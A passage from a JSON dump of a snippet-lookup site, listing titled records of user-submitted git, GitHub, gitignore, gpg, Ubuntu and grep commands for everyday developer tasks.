    "description": "git reset --soft HEAD@{1}\n# Move the current head so that it's pointing at the old commit # Leave the index intact for redoing the commit. # HEAD@{1} gives you \"the commit that HEAD pointed at before  # it was moved to where it currently points at\". Note that this is # different from HEAD~1, which gives you \"the commit that is the # parent node of the commit that HEAD is currently pointing to.\" git reset --soft HEAD@{1}  # commit the current tree using the commit details of the previous # HEAD commit. (Note that HEAD@{1} is pointing somewhere different from the # previous command. It's now pointing at the erroneously amended commit.) git commit -C HEAD@{1}\n",
    "reg_date": "2021-10-11T22:05:42.000Z"
  },
  {
    "id": 2000,
    "keyword": null,
    "link": null,
    "title": " git undo comflicted merge",
    "description": "git merge --abort\n",
    "reg_date": "2021-10-11T22:05:42.000Z"
  },
  {
    "id": 2001,
    "keyword": null,
    "link": null,
    "title": " git undo commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\n# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n#this  will preserve changes done to your files git reset --soft HEAD~1  #this will get rid of the commit and the changes done to the files $ git reset --hard HEAD~1  \n$ git reset --hard HEAD~1 \n",
    "reg_date": "2021-10-11T22:05:43.000Z"
  },
  {
    "id": 2002,
    "keyword": null,
    "link": null,
    "title": " git undo commit keep changes",
    "description": "#windows git reset --soft HEAD~1\ngit reset HEAD^ --soft\ngit reset @~\ngit reset HEAD^\ngit reset HEAD^ git reset\n",
    "reg_date": "2021-10-11T22:05:43.000Z"
  },
  {
    "id": 2003,
    "keyword": null,
    "link": null,
    "title": " git undo last commit",
    "description": "# KEEP CHANGES git reset --soft HEAD~1  # REMOVE CHANGES git reset --hard HEAD~1\n# Uncommit the changes git reset --soft HEAD~1  # Completely delete the changes git reset --hard HEAD~1\ngit reset --soft HEAD~1\n$ git reset --soft HEAD~1\n$ git reset --soft HEAD~1 \n# Undo last commit. # --soft flag makes sure that the changes in undone revisions are preserved. # You'll find the changes as uncommitted local modifications in your working copy. git reset --soft HEAD~1  # If you don't want to keep these changes, simply use the --hard flag. # This will completely remove the changes. git reset --hard HEAD~1\n",
    "reg_date": "2021-10-11T22:05:43.000Z"
  },
  {
    "id": 2004,
    "keyword": null,
    "link": null,
    "title": " git undo merge",
    "description": "git merge --abort\n$ git reset --hard HEAD~1 \ngit reset --hard HEAD~1 \ngit revert -m 1 <merge-commit> \ngit reset --merge HEAD~1\ngit reset --hard HEAD~1 git reset --hard <commit_sha>\n",
    "reg_date": "2021-10-11T22:05:44.000Z"
  },
  {
    "id": 2005,
    "keyword": null,
    "link": null,
    "title": " git undo rebase",
    "description": "git reflog \ngit reset --hard ORIG_HEAD \ngit reset --hard HEAD@{5} \ngit reflog # determine pre-rebase head number, N git reset --hard HEAD@{N}\n",
    "reg_date": "2021-10-11T22:05:44.000Z"
  },
  {
    "id": 2006,
    "keyword": null,
    "link": null,
    "title": " git undo stage",
    "description": "git reset \ngit reset HEAD file_path\ngit reset <file> \n",
    "reg_date": "2021-10-11T22:05:44.000Z"
  },
  {
    "id": 2007,
    "keyword": null,
    "link": null,
    "title": " git unset alias",
    "description": "git config --global --unset alias.trololo\n",
    "reg_date": "2021-10-11T22:05:45.000Z"
  },
  {
    "id": 2008,
    "keyword": null,
    "link": null,
    "title": " git untrack file",
    "description": "git rm --cached filename\ngit rm --cached <file>  git rm -r --cached <folder>\nUpdate your . gitignore file &ndash; for instance, add a folder you don't want to track to . gitignore . git rm -r --cached . &ndash; Remove all tracked files, including wanted and unwanted. Your code will be safe as long as you have saved locally. git add . &ndash; All files will be added back in, except those in . gitignore .\ngit rm -r --cached .\ngit ls-files --ignored --exclude-standard -z | xargs -0 git rm --cached git commit -am \"Remove ignored files\"   // answer from: thSoft\ngit rm -r --cached\n",
    "reg_date": "2021-10-11T22:05:45.000Z"
  },
  {
    "id": 2009,
    "keyword": null,
    "link": null,
    "title": " git update all submodules",
    "description": "git submodule update --recursive --remote \ngit submodule update --init --recursive\n",
    "reg_date": "2021-10-11T22:05:45.000Z"
  },
  {
    "id": 2010,
    "keyword": null,
    "link": null,
    "title": " git update branch list",
    "description": "git remote update origin --prune \n",
    "reg_date": "2021-10-11T22:05:45.000Z"
  },
  {
    "id": 2011,
    "keyword": null,
    "link": null,
    "title": " git update branches",
    "description": "git remote update origin --prune \n",
    "reg_date": "2021-10-11T22:05:46.000Z"
  },
  {
    "id": 2012,
    "keyword": null,
    "link": null,
    "title": " git update gitignore",
    "description": "git rm -r --cached . git add . git commit -m \"update gitignore\"\n# rm all files git rm -r --cached . # add all files as per new .gitignore git add . # now, commit for new .gitignore to apply git commit -m \".gitignore is now working\" \ngit rm -r --cached . \n$ touch .gitignore\ngit ls-files --ignored --exclude-standard -z | xargs -0 git rm --cached git commit -am \"Remove ignored files\"   // answer from: thSoft\n",
    "reg_date": "2021-10-11T22:05:46.000Z"
  },
  {
    "id": 2013,
    "keyword": null,
    "link": null,
    "title": " git update local repo from master",
    "description": "git pull origin master \n",
    "reg_date": "2021-10-11T22:05:47.000Z"
  },
  {
    "id": 2014,
    "keyword": null,
    "link": null,
    "title": " git update on linux",
    "description": "apt-get update apt-get upgrade apt-get install git \n",
    "reg_date": "2021-10-11T22:05:47.000Z"
  },
  {
    "id": 2015,
    "keyword": null,
    "link": null,
    "title": " git update remote origin",
    "description": "git remote set-url origin new.git.url/here\ngit remote set-url origin git@your.git.repo.example.com:user/repository2.git\ngit remote set-url origin git@accountname.git.beanstalkapp.com:/your-repository.git\ngit remote set-url origin new.git.url/here \ngit remote set-url origin new.git.url/here  git remote add origin new.git.url/here \n",
    "reg_date": "2021-10-11T22:05:47.000Z"
  },
  {
    "id": 2016,
    "keyword": null,
    "link": null,
    "title": " git update submodule recursive",
    "description": "git submodule update --init --recursive \n",
    "reg_date": "2021-10-11T22:05:47.000Z"
  },
  {
    "id": 2017,
    "keyword": null,
    "link": null,
    "title": " git update upstream url",
    "description": "# change remote url git remote set-url origin https://github.com/USERNAME/REPOSITORY.git\ngit remote set-url origin https://hostname/USERNAME/REPOSITORY.git\n# Overwriting an existing git url: git remote set-url origin <git_url>\ngit remote set-url upstream https://hostname/USERNAME/REPOSITORY.git\n",
    "reg_date": "2021-10-11T22:05:48.000Z"
  },
  {
    "id": 2018,
    "keyword": null,
    "link": null,
    "title": " git update using git bash",
    "description": "# Since Git 2.16.1(2) you can use C:\\> git update-git-for-windows  #In version between 2.14.2 and 2.16.1, the command was C:\\> git update\n",
    "reg_date": "2021-10-11T22:05:48.000Z"
  },
  {
    "id": 2019,
    "keyword": null,
    "link": null,
    "title": " git updates were rejected because the tip of your current branch is behind",
    "description": "git push -f origin master\n# You can force push your local code status by -f  # Do this, if you are sure that your commit status in local should be reflected in remote too.  git push -f origin master\n",
    "reg_date": "2021-10-11T22:05:48.000Z"
  },
  {
    "id": 2020,
    "keyword": null,
    "link": null,
    "title": " git user.name user.email",
    "description": "git config --global user.name \"Your Name\" git config --global user.email \"youremail@yourdomain.com\"\nTo set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\ngit config user.name git config user.email\ngit config --global user.name \"John Smith\" git config --global user.email \"johnsmith@example.com\"\n",
    "reg_date": "2021-10-11T22:05:48.000Z"
  },
  {
    "id": 2021,
    "keyword": null,
    "link": null,
    "title": " git user email",
    "description": "git config --global user.name \"Your Name\" git config --global user.email \"youremail@yourdomain.com\"\ngit config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\ngit config --global user.name \"John Smith\" git config --global user.email \"johnsmith@example.com\"\n",
    "reg_date": "2021-10-11T22:05:49.000Z"
  },
  {
    "id": 2022,
    "keyword": null,
    "link": null,
    "title": " git username",
    "description": "git config --global user.name \"Your Name\" git config --global user.email \"youremail@yourdomain.com\"\ngit config --global user.email \"my.adresse@hotmail.com\" git config --global user.name \"My Name\"\n$ git config --global user.name \"John Doe\" $ git config --global user.email johndoe@example.com\n$ git config --global user.name > \"John Smith\"  $ git config --global user.email  > \"johnsmith@example.com\"  if you have configured multiple git users in your machine $ git config --global user.name ### It will give name of git user who is globaly scoped $ git config user.name ### It will give name of git user who has scope with respect to current repository \nTo set your global username/email configuration: Open the command line. Set your username: git config --global user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config --global user.email \"MY_NAME@example.com\" To set repository-specific username/email configuration: From the command line, change into the repository directory. Set your username: git config user.name \"FIRST_NAME LAST_NAME\" Set your email address: git config user.email \"MY_NAME@example.com\" Verify your configuration by displaying your configuration file: cat .git/config\ngit config --global user.email \"my.adresse@hotmail.com\"\n",
    "reg_date": "2021-10-11T22:05:49.000Z"
  },
  {
    "id": 2023,
    "keyword": null,
    "link": null,
    "title": " git view remote url",
    "description": " git config --get remote.origin.url\n# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote show origin\n$ git remote -v origin\thttps://github.com/schacon/ticgit (fetch) origin\thttps://github.com/schacon/ticgit (push)\n# when you are not connected to the network, you can use this git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:05:49.000Z"
  },
  {
    "id": 2024,
    "keyword": null,
    "link": null,
    "title": " git vs code editor",
    "description": "git config --global core.editor \"code -w\"\n",
    "reg_date": "2021-10-11T22:05:49.000Z"
  },
  {
    "id": 2025,
    "keyword": null,
    "link": null,
    "title": " github add new origin",
    "description": "git init . git remote add origin <http/someURL> git pull origin master\n",
    "reg_date": "2021-10-11T22:05:49.000Z"
  },
  {
    "id": 2026,
    "keyword": null,
    "link": null,
    "title": " github cli homebrew",
    "description": "brew install gh\n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2027,
    "keyword": null,
    "link": null,
    "title": " github cli linux",
    "description": "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo gpg --dearmor -o /usr/share/keyrings/githubcli-archive-keyring.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main\" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null sudo apt update sudo apt install gh\n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2028,
    "keyword": null,
    "link": null,
    "title": " github cli ubuntu",
    "description": "curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg | sudo gpg --dearmor -o /usr/share/keyrings/githubcli-archive-keyring.gpg echo \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] https://cli.github.com/packages stable main\" | sudo tee /etc/apt/sources.list.d/github-cli.list > /dev/null sudo apt update sudo apt install gh\n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2029,
    "keyword": null,
    "link": null,
    "title": " github clone single brach",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2030,
    "keyword": null,
    "link": null,
    "title": " github command for adding all files",
    "description": "To add all files in Git Staging Area  git add .\n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2031,
    "keyword": null,
    "link": null,
    "title": " github commit",
    "description": "git config --global user.email \"my.adresse@hotmail.com\"\ngit commit -m \"message\"\ngit commit -m \"msg\"\n// ready the changes for commit git add .  // commit your changes with a message git commit -m \"Your message to refernce your commit\"\ngit commit -m \"Your Messege Here\"\n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2032,
    "keyword": null,
    "link": null,
    "title": " github commit author name",
    "description": "git commit --amend --author=\"Author Name <email@address.com>\" --no-edit \ngit log --author=\"Jon\" \n",
    "reg_date": "2021-10-11T22:05:50.000Z"
  },
  {
    "id": 2033,
    "keyword": null,
    "link": null,
    "title": " github custom domain ip",
    "description": "185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153\n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2034,
    "keyword": null,
    "link": null,
    "title": " github delete branch remote",
    "description": "$ git push origin --delete feature/login \n$ git push -d <remote_name> <branch_name> $ git branch -d <branch_name> \n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2035,
    "keyword": null,
    "link": null,
    "title": " github desktop for ubuntu",
    "description": "sudo wget https://github.com/shiftkey/desktop/releases/download/release-2.1.0-linux1/GitHubDesktop-linux-2.1.0-linux1.deb sudo gdebi GitHubDesktop-linux-2.1.0-linux1.deb\n# For 2.9.0 latest version sudo wget https://github.com/shiftkey/desktop/releases/download/release-2.9.0-linux2/GitHubDesktop-linux-2.9.0-linux2.deb sudo apt-get install gdebi-core sudo gdebi GitHubDesktop-linux-2.9.0-linux2.deb  # Use the source link for latest versions  # https://dev.to/danyson/how-to-install-github-desktop-for-ubuntu-debian-4hko\nsudo wget https://github.com/shiftkey/desktop/releases/download/release-2.9.0-linux2/GitHubDesktop-linux-2.9.0-linux2.deb sudo apt-get install gdebi-core sudo gdebi GitHubDesktop-linux-2.9.0-linux2.deb\n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2036,
    "keyword": null,
    "link": null,
    "title": " github dns",
    "description": "185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153\n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2037,
    "keyword": null,
    "link": null,
    "title": " github how to clone private repo",
    "description": " 1.Generate new token -> https://github.com/settings/tokens 2.$ git clone https://github.com/username/repo.git Username: your_username Password: your_token\ngit clone https://strafe:mygithubpassword@github.com/strafe/project.git \nGit SCM - command line tools [https://git-scm.com/] TortoiseGit - gui tools [https://tortoisegit.org/]\n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2038,
    "keyword": null,
    "link": null,
    "title": " github invitation",
    "description": "go to https://github.com/username/reponame/invitations   #You can't see invitations from the home page (as of 04/2021) #Just go to <reponame>/invitations\n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2039,
    "keyword": null,
    "link": null,
    "title": " github markdown table",
    "description": "| First Header  | Second Header | | ------------- | ------------- | | Content Cell  | Content Cell  | | Content Cell  | Content Cell  |\n",
    "reg_date": "2021-10-11T22:05:51.000Z"
  },
  {
    "id": 2040,
    "keyword": null,
    "link": null,
    "title": " github name servers",
    "description": "185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2041,
    "keyword": null,
    "link": null,
    "title": " github pages dns",
    "description": "185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2042,
    "keyword": null,
    "link": null,
    "title": " github pages dns records",
    "description": "185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2043,
    "keyword": null,
    "link": null,
    "title": " github pages with favicon",
    "description": "<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"favicon.ico\">\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2044,
    "keyword": null,
    "link": null,
    "title": " github private key",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2045,
    "keyword": null,
    "link": null,
    "title": " github remove env file from history",
    "description": "git filter-branch --index-filter \"git rm -rf --cached --ignore-unmatch .env\" HEAD git push --force\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2046,
    "keyword": null,
    "link": null,
    "title": " github see the username",
    "description": "git config user.name\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2047,
    "keyword": null,
    "link": null,
    "title": " github set branch upstream",
    "description": "git branch --set-upstream-to <remote-branch>  // example git branch --set-upstream-to origin feature-branch  // show up which remote branch a local branch is tracking git branch -vv  // short version to set upstream with very first push git push -u origin local-branch\ngit push --set-upstream origin <remote-branch>\n",
    "reg_date": "2021-10-11T22:05:52.000Z"
  },
  {
    "id": 2048,
    "keyword": null,
    "link": null,
    "title": " github ssh test",
    "description": " ssh -T git@github.com\n",
    "reg_date": "2021-10-11T22:05:53.000Z"
  },
  {
    "id": 2049,
    "keyword": null,
    "link": null,
    "title": " github track filename capitalisation",
    "description": "git config core.ignorecase false\nIf you need to commit files renaming, just capitalization, and you have a problems with staging/commiting, as option  - Change capitalization of \"file\" name and add \"1\" to the end (or other symbol) - Stage (without commit) = result \"File1\" - renaming files - Remove \"1\" from the end - Stage (without commit) = result \"File\" - renaming files (only capitalization now) - Do commit.\n",
    "reg_date": "2021-10-11T22:05:53.000Z"
  },
  {
    "id": 2050,
    "keyword": null,
    "link": null,
    "title": " github untrack files",
    "description": "git rm -r --cached .\n",
    "reg_date": "2021-10-11T22:05:53.000Z"
  },
  {
    "id": 2051,
    "keyword": null,
    "link": null,
    "title": " github username and password git clone",
    "description": "git clone https://username:password@github.com/username/repository.git  or  git clone https://username@github.com/username/repository.git It will prompt you for your password.   \ngit clone https://username:password@github.com/username/repository.git \n",
    "reg_date": "2021-10-11T22:05:54.000Z"
  },
  {
    "id": 2052,
    "keyword": null,
    "link": null,
    "title": " github wiki link to another page",
    "description": "[[Link Text|WikiPage]] \n",
    "reg_date": "2021-10-11T22:05:54.000Z"
  },
  {
    "id": 2053,
    "keyword": null,
    "link": null,
    "title": " gitignore doesnt delte remote files",
    "description": "git rm -r --cached some-directory git commit -m 'Remove the now ignored directory \"some-directory\"' git push origin master\n",
    "reg_date": "2021-10-11T22:05:54.000Z"
  },
  {
    "id": 2054,
    "keyword": null,
    "link": null,
    "title": " gitignore for django project",
    "description": " ### Django ### *.log *.pot *.pyc __pycache__/ local_settings.py db.sqlite3 media/ staticfiles/  # Backup files #  *.bak   ### Django.Python Stack ### *.py[cod] *$py.class  # C extensions *.so  # Distribution / packaging .Python build/ develop-eggs/ dist/ downloads/ eggs/ .eggs/ lib/ lib64/ parts/ sdist/ var/ wheels/ share/python-wheels/ *.egg-info/ .installed.cfg *.egg .Python build/  MANIFEST   # PyInstaller #  Usually these files are written by a python script from a template #  before PyInstaller builds the exe, so as to inject date/other infos into it. *.manifest *.spec  # Installer logs pip-log.txt pip-delete-this-directory.txt  # Unit test / coverage reports htmlcov/ .tox/ .nox/ .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover *.py,cover .hypothesis/ .pytest_cache/ cover/    # Translations *.mo  # pyenv  .python-version   # PEP 582; used by e.g. github.com/David-OConnor/pyflow __pypackages__/   # SageMath parsed files *.sage.py  # Environments .env .venv env/ venv/ ENV/ env.bak/ venv.bak/  # mkdocs documentation  /site   # mypy .mypy_cache/ .dmypy.json dmypy.json  # Pyre type checker .pyre/  # pytype static type analyzer .pytype/  # Cython debug symbols cython_debug/  # Visual Studio Code #  .vscode/*  !.vscode/settings.json  !.vscode/tasks.json  !.vscode/launch.json  !.vscode/extensions.json  .history \n# Django # *.log *.pot *.pyc __pycache__ db.sqlite3 media  # Backup files #  *.bak   # If you are using PyCharm #  .idea/**/workspace.xml  .idea/**/tasks.xml  .idea/dictionaries  .idea/**/dataSources/  .idea/**/dataSources.ids  .idea/**/dataSources.xml  .idea/**/dataSources.local.xml  .idea/**/sqlDataSources.xml  .idea/**/dynamic.xml  .idea/**/uiDesigner.xml  .idea/**/gradle.xml  .idea/**/libraries  *.iws /out/   # Python #  *.py[cod]  *$py.class   # Distribution / packaging  .Python build/  develop-eggs/  dist/  downloads/  eggs/  .eggs/  lib/  lib64/  parts/  sdist/  var/  wheels/  *.egg-info/  .installed.cfg  *.egg  *.manifest  *.spec   # Installer logs  pip-log.txt  pip-delete-this-directory.txt   # Unit test / coverage reports  htmlcov/  .tox/  .coverage  .coverage.*  .cache  .pytest_cache/  nosetests.xml  coverage.xml  *.cover  .hypothesis/   # Jupyter Notebook  .ipynb_checkpoints   # pyenv  .python-version   # celery  celerybeat-schedule.*   # SageMath parsed files  *.sage.py   # Environments  .env  .venv  env/  venv/  ENV/  env.bak/  venv.bak/   # mkdocs documentation  /site   # mypy  .mypy_cache/   # Sublime Text #  *.tmlanguage.cache  *.tmPreferences.cache  *.stTheme.cache  *.sublime-workspace  *.sublime-project   # sftp configuration file  sftp-config.json   # Package control specific files Package  Control.last-run  Control.ca-list  Control.ca-bundle  Control.system-ca-bundle  GitHub.sublime-settings   # Visual Studio Code #  .vscode/*  !.vscode/settings.json  !.vscode/tasks.json  !.vscode/launch.json  !.vscode/extensions.json  .history \n # Byte-compiled / optimized / DLL files __pycache__/ *.py[cod] *$py.class  # C extensions *.so  # Distribution / packaging .Python env/ build/ develop-eggs/ dist/ downloads/ eggs/ .eggs/ lib/ lib64/ parts/ sdist/ var/ wheels/ *.egg-info/ .installed.cfg *.egg  # PyInstaller #  Usually these files are written by a python script from a template #  before PyInstaller builds the exe, so as to inject date/other infos into it. *.manifest *.spec  # Installer logs pip-log.txt pip-delete-this-directory.txt  # Unit test / coverage reports htmlcov/ .tox/ .coverage .coverage.* .cache nosetests.xml coverage.xml *.cover .hypothesis/  # Translations *.mo *.pot  # Django stuff: *.log local_settings.py  # Flask stuff: instance/ .webassets-cache  # Scrapy stuff: .scrapy  # Sphinx documentation docs/_build/  # PyBuilder target/  # Jupyter Notebook .ipynb_checkpoints  # pyenv .python-version  # celery beat schedule file celerybeat-schedule  # SageMath parsed files *.sage.py  # dotenv .env  # virtualenv .venv venv/ ENV/ .vscode # Spyder project settings .spyderproject .spyproject  # Rope project settings .ropeproject  # mkdocs documentation /site  # mypy .mypy_cache/  .DS_Store *.sqlite3 media/ *.pyc *.db *.pid  # Ignore Django Migrations in Development if you are working on team  # Only for Development only # **/migrations/** # !**/migrations # !**/migrations/__init__.py\n# Django # *.log *.pot *.pyc __pycache__ db.sqlite3 media  # Backup files #  *.bak   # If you are using PyCharm #  .idea/**/workspace.xml  .idea/**/tasks.xml  .idea/dictionaries  .idea/**/dataSources/  .idea/**/dataSources.ids  .idea/**/dataSources.xml  .idea/**/dataSources.local.xml  .idea/**/sqlDataSources.xml  .idea/**/dynamic.xml  .idea/**/uiDesigner.xml  .idea/**/gradle.xml  .idea/**/libraries  *.iws /out/   # Python #  *.py[cod]  *$py.class   # Distribution / packaging  .Python build/  develop-eggs/  dist/  downloads/  eggs/  .eggs/  lib/  lib64/  parts/  sdist/  var/  wheels/  *.egg-info/  .installed.cfg  *.egg  *.manifest  *.spec   # Installer logs  pip-log.txt  pip-delete-this-directory.txt   # Unit test / coverage reports  htmlcov/  .tox/  .coverage  .coverage.*  .cache  .pytest_cache/  nosetests.xml  coverage.xml  *.cover  .hypothesis/   # Jupyter Notebook  .ipynb_checkpoints   # pyenv  .python-version   # celery  celerybeat-schedule.*   # SageMath parsed files  *.sage.py   # Environments  .env  .venv  env/  venv/  ENV/  env.bak/  venv.bak/   # mkdocs documentation  /site   # mypy  .mypy_cache/   # Sublime Text #  *.tmlanguage.cache  *.tmPreferences.cache  *.stTheme.cache  *.sublime-workspace  *.sublime-project   # sftp configuration file  sftp-config.json   # Package control specific files Package  Control.last-run  Control.ca-list  Control.ca-bundle  Control.system-ca-bundle  GitHub.sublime-settings   # Visual Studio Code #  .vscode/*  !.vscode/settings.json  !.vscode/tasks.json  !.vscode/launch.json  !.vscode/extensions.json  .history\n",
    "reg_date": "2021-10-11T22:05:54.000Z"
  },
  {
    "id": 2055,
    "keyword": null,
    "link": null,
    "title": " gitignore visual studio not working android",
    "description": "git rm -rf --cached . git add .\n",
    "reg_date": "2021-10-11T22:05:54.000Z"
  },
  {
    "id": 2056,
    "keyword": null,
    "link": null,
    "title": " gitigore rm cache",
    "description": "git rm -r --cached . \n",
    "reg_date": "2021-10-11T22:05:54.000Z"
  },
  {
    "id": 2057,
    "keyword": null,
    "link": null,
    "title": " gitlab set global username and password",
    "description": "git config --global credential.helper store git pull # Ask for username and password, after that these are stored\n",
    "reg_date": "2021-10-11T22:05:55.000Z"
  },
  {
    "id": 2058,
    "keyword": null,
    "link": null,
    "title": " gnome 3 show seconds",
    "description": "gsettings set org.gnome.desktop.interface clock-show-seconds true \n",
    "reg_date": "2021-10-11T22:05:55.000Z"
  },
  {
    "id": 2059,
    "keyword": null,
    "link": null,
    "title": " gnome disk utility ubuntu",
    "description": "#gnome disk utility ubuntu sudo apt-get install -y gnome-disk-utility gnome-disks \n",
    "reg_date": "2021-10-11T22:05:55.000Z"
  },
  {
    "id": 2060,
    "keyword": null,
    "link": null,
    "title": " gnome shell extensions ubuntu 20.04",
    "description": "Step 1:  sudo apt install gnome-shell-extensions Step 2:  Re-login from your Ubuntu desktop. Step 3:  Open up GNOME tweaks and enable any desired Gnome extensions Step 4: To install other extensions via Gnome extensions first we need to install GNOME Shell integration add-on.  https://extensions.gnome.org/ Step 5:  Before we can install any additional extensions we first need to configure Gnome shell host connector. To do so execute the following Linux command: sudo apt install chrome-gnome-shell  For more details, read this article https://linuxconfig.org/how-to-install-gnome-shell-extensions-on-ubuntu-20-04-focal-fossa-linux-desktop\n",
    "reg_date": "2021-10-11T22:05:55.000Z"
  },
  {
    "id": 2061,
    "keyword": null,
    "link": null,
    "title": " gnupg, gnupg2 and gnupg1 do not seem to be installed, but one of them is required for this operation",
    "description": "RUN apt-get update && apt-get install -y gnupg \n",
    "reg_date": "2021-10-11T22:05:55.000Z"
  },
  {
    "id": 2062,
    "keyword": null,
    "link": null,
    "title": " god mod windows",
    "description": "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}\n",
    "reg_date": "2021-10-11T22:05:55.000Z"
  },
  {
    "id": 2063,
    "keyword": null,
    "link": null,
    "title": " got remote url",
    "description": "git config --get remote.origin.url\n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2064,
    "keyword": null,
    "link": null,
    "title": " gpg: can't connect to the agent: IPC connect call failed",
    "description": "sudo add-apt-repository ppa:rafaeldtinoco/lp1871129 sudo apt update sudo apt install libc6=2.31-0ubuntu8+lp1871129~1 libc6-dev=2.31-0ubuntu8+lp1871129~1 libc-dev-bin=2.31-0ubuntu8+lp1871129~1 -y --allow-downgrades sudo apt-mark hold libc6\n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2065,
    "keyword": null,
    "link": null,
    "title": " gpg2 install ubuntu",
    "description": "#-------------------------------- gpg2 ---------------------------------- sudo apt-get install gnupg2 -y gpg2 --list-keys \n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2066,
    "keyword": null,
    "link": null,
    "title": " gpg get private key",
    "description": "# Export Public Key # This command will export an ascii armored version of the public key: gpg --output public.pgp --armor --export username@email # Export Secret Key # This command will export an ascii armored version of the secret key: gpg --output private.pgp --armor --export-secret-key username@email\n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2067,
    "keyword": null,
    "link": null,
    "title": " gradle threw an error while downloading artifacts from the network. retrying to download",
    "description": "Do follow some steps:  Go to flutter_app => android => gradle => wrapper directory Delete gradle-wrapper.jar file Open and edit gradle-wrapper.properties file Change distributionUrl=https://services.gradle.org/distributions/gradle-x.x.x-all.zip to gradle-6.4.1-all.zip or latest On terminal use flutter run command I solved my issue, hopefully yours\n#windows users This can be solved by adding environment variable for jdk. Or delete the .gradle folder under C:\\users'Your username'\\  #linux users   delete the .gradle folder under /home/user_name\n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2068,
    "keyword": null,
    "link": null,
    "title": " grafana cli restart",
    "description": "sudo service grafana-server restart\n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2069,
    "keyword": null,
    "link": null,
    "title": " grant superuser permission to sudo user ubuntu",
    "description": "adduser sudo_user_name //grant privileges visudo under line  root ALL=(ALL:ALL) ALL  add this line sudo_user_name ALL=(ALL:ALL) ALL sudo apt-get update\n",
    "reg_date": "2021-10-11T22:05:56.000Z"
  },
  {
    "id": 2070,
    "keyword": null,
    "link": null,
    "title": " grep 2 matches or",
    "description": "Just use one of following forms with grep or egrep commands :) grep \"PATTERN1\\|PATTERN2\" FILE grep -E \"PATTERN1|PATTERN2\" FILE grep -e PATTERN1 -e PATTERN2 FILE egrep \"PATTERN1|PATTERN2\" FILE\n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2071,
    "keyword": null,
    "link": null,
    "title": " grep before and after",
    "description": "grep -B 5 -A 2 --color 'keyword' /path/to/file.log\ngrep -C 3 foo README.txt \n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2072,
    "keyword": null,
    "link": null,
    "title": " grep but exclude directory",
    "description": "grep -rli --exclude-dir={dir1,dir2,dir3} keyword /path/to/search\ngrep -rli --exclude-dir=/path/to/exclude \"keyword\"\n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2073,
    "keyword": null,
    "link": null,
    "title": " grep commands used in linux historic",
    "description": "history|grep <search>\n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2074,
    "keyword": null,
    "link": null,
    "title": " grep count lines",
    "description": "cat myfile | wc -l\nwc -l myfile \ncat -n myfile \n grep -c ^ filename \ncat myfile | wc -l \n",
    "reg_date": "2021-10-11T22:05:57.000Z"
  },
  {
    "id": 2075,
    "keyword": null,
    "link": null,
    "title": " grep cron log",
